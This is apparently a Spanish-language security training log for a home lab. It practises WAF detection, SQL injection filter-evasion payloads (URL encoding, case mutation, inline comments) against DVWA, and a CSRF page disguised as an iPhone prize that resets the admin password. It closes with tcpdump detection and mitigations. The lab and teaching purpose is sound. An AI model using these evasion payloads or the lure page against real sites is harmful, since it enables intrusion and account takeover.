# Día 10 — WAF Detection & Evasion

**Fecha:** Abril 2026  
**MITRE:** T1190  
**DVWA:** CSRF (Low)

---

## Teoría

### WAF (Web Application Firewall)
Un WAF inspecciona tráfico HTTP/HTTPS y bloquea requests maliciosos basándose en patrones conocidos (SQLi, XSS, path traversal). Como atacante es necesario detectar su presencia antes de lanzar payloads. Como SOC Analyst, entender evasión enseña qué alertas buscar cuando un atacante intenta bypasear defensas.

### CSRF (Cross-Site Request Forgery)
CSRF permite realizar peticiones no autorizadas a través de páginas maliciosas, abusando la sesión activa de la víctima. El atacante no necesita la cookie — el browser de la víctima la adjunta automáticamente al ejecutar el request. Con este método es posible modificar credenciales de acceso sin que el usuario lo sepa.

---

## Red Team

### Sección 1 — Detección con wafw00f

```bash
wafw00f http://192.168.1.96
wafw00f http://192.168.1.96:8080
```

**Resultado:** No WAF detected. El entorno de laboratorio no tiene WAF comercial activo.

### Sección 2 — Fingerprint con curl

```bash
curl -I http://192.168.1.96
curl -I http://192.168.1.96:8080
```

**Hallazgos:**
- Puerto 80: `Server: Apache` — versión oculta, buena práctica
- Puerto 80: `X-Frame-Options: DENY` — protección anti-clickjacking
- Puerto 8080: `Server: Apache/2.4.25 (Debian)` — versión expuesta
- Puerto 8080: `security=low` visible en cookies
- Payloads SQLi → sin bloqueo en ambos puertos

### Sección 3 — Técnicas de Evasión

Sin WAF activo, se practicaron las técnicas que evaden filtros de detección de patrones en entornos reales.

**URL Encoding**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/sqli/?id=1%27%20UNION%20SELECT%20null%2Cnull--%20-&Submit=Submit" \
  -b "PHPSESSID=<session>; security=low"
```
El WAF busca `UNION SELECT` en texto plano. `%20` y `%27` rompen el patrón — el servidor decodifica y ejecuta igual.

**Case Mutation** *(favorita por su facilidad de escritura)*
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/sqli/?id=1%27%20UnIoN%20SeLeCt%20null%2Cnull--%20-&Submit=Submit" \
  -b "PHPSESSID=<session>; security=low"
```
Las reglas WAF suelen ser case-sensitive. La DB no lo es.

**Comentarios SQL inline**
```bash
curl -s "http://192.168.1.96:8080/vulnerabilities/sqli/?id=1'/**/UNION/**/SELECT/**/null,null--%20-&Submit=Submit" \
  -b "PHPSESSID=<session>; security=low"
```
`/**/` es un comentario vacío válido en SQL. El WAF ve caracteres extraños — la DB los ignora y ejecuta el query normal.

**Resultado:** Las tres técnicas ejecutaron UNION SELECT exitosamente.

### Sección 4 — DVWA CSRF (Low)

**Payload directo:**
```
http://192.168.1.96:8080/vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change
```

**Página maliciosa (`evil.html`):**
```html
<!DOCTYPE html>
<html>
<head>
  <title>Gana un iPhone 16 Pro</title>
</head>
<body>
  <h1>¡Felicidades! Fuiste seleccionado</h1>
  <p>Haz clic en el botón para reclamar tu premio...</p>
  <button onclick="document.getElementById('f').submit()">Reclamar premio</button>

  <form id="f" action="http://192.168.1.96:8080/vulnerabilities/csrf/" method="GET">
    <input type="hidden" name="password_new" value="pwned">
    <input type="hidden" name="password_conf" value="pwned">
    <input type="hidden" name="Change" value="Change">
  </form>
</body>
</html>
```

**Servidor para servir la página:**
```bash
cd /tmp && python3 -m http.server 8000
```

**Resultado:** Contraseña del admin cambiada a `pwned` sin interacción consciente de la víctima. El browser adjuntó la cookie de sesión automáticamente al visitar la página maliciosa.

---

## Blue Team

### Captura de tráfico con tcpdump

Desde Ubuntu se capturó el tráfico generado por el payload CSRF:

```bash
sudo tcpdump -i any -A -s 0 'tcp port 8080 and host 192.168.1.132 and not port 22' 2>/dev/null | grep -E "password_new|Change|GET|POST"
```

**Output capturado:**
```
GET /vulnerabilities/csrf/?password_new=pwned&password_conf=pwned&Change=Change HTTP/1.1
```

**Observaciones:**
- El request viaja en texto plano — los parámetros son visibles en la URL
- La IP origen 192.168.1.132 (Kali) queda registrada en el tráfico
- Un IDS configurado para detectar `password_new` en requests GET lo alertaría inmediatamente
- En entornos con HTTPS el payload viajaría cifrado pero quedaría visible en los logs del servidor web

### Mitigación CSRF
- Implementar CSRF tokens en formularios
- Verificar header `Referer` en el servidor
- Usar `SameSite=Strict` en cookies de sesión

---

## Conclusión

Un entorno sin WAF es transparente a cualquier técnica de evasión. En entornos reales, URL Encoding, Case Mutation y comentarios SQL inline son las primeras técnicas a intentar antes de herramientas automatizadas. CSRF demuestra que la autenticación sola no es suficiente — el servidor debe verificar el origen e intención de cada request.
